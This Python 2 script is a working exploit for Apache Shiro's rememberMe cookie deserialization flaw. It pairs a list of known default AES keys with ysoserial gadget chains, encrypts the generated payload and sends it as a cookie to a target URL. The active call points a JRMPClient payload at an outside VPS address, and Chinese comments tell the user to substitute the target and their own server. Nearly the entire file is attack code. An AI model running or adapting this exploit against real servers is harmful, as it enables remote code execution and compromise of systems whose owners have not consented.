#coding: utf-8
import os
import re
import time
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#JAR_FILE = 'ysoserial-master-SNAPSHOT.jar'
JAR_FILE = 'ysoserial.jar'
keys = ['kPH+bIxk5D2deZiIxcaaaA==','Z3VucwAAAAAAAAAAAAAAAA==','kPH+bIxk5D2deZiIxcaaaA==','4AvVhmFLUs0KTA3Kprsdag==','3AvVhmFLUs0KTA3Kprsdag==','2AvVhdsgUs0FSA3SDFAdag==','wGiHplamyXlVB11UXWol8g==','fCq+/xW488hMTCD+cmJ3aQ==','1QWLxg+NYmxraMoxAXu/Iw==','ZUdsaGJuSmxibVI2ZHc9PQ==','L7RioUULEFhRyxM7a2R/Yg== ','6ZmI6I2j5Y+R5aSn5ZOlAA==','r0e3c16IdVkouZgk1TKVMg==','ZWvohmPdUsAWT3=KpPqda','5aaC5qKm5oqA5pyvAAAAAA==','bWluZS1hc3NldC1rZXk6QQ==','a2VlcE9uR29pbmdBbmRGaQ==','WcfHGU25gNnTxTlmJMeSpw==','LEGEND-CAMPUS-CIPHERKEY==','3AvVhmFLUs0KTA3Kprsdag==']
lis = ["BeanShell1","C3P0","Clojure","CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JRMPClient","JRMPListener","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Wicket1",]
#keys = ['4AvVhmFLUs0KTA3Kprsdag==','']
def poc(url, rce_command,key,func):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(rce_command, JAR_FILE,key,func)  # 生成payload
        #print payload
        print payload.decode()
        #exit()
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
    except Exception, e:
        print(e)
        pass
    return False
def generator(command, fp,aeskey,func):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    
    popen = subprocess.Popen(['java', '-jar', fp,func, command],stdout=subprocess.PIPE)
 
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = aeskey
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
    
# poc('http://124.16.75.162:30003/','39.108.99.6:1099',keys[1],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己VPS的地址
poc('http://192.168.78.166:8080/samples-web-1.4.1/','39.108.99.6:1099',keys[0],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己VPS的地址
# poc('http://192.168.78.166:8080/samples-web-1.4.1/','touch /tmp/success',keys[0],'CommonsCollections3') 
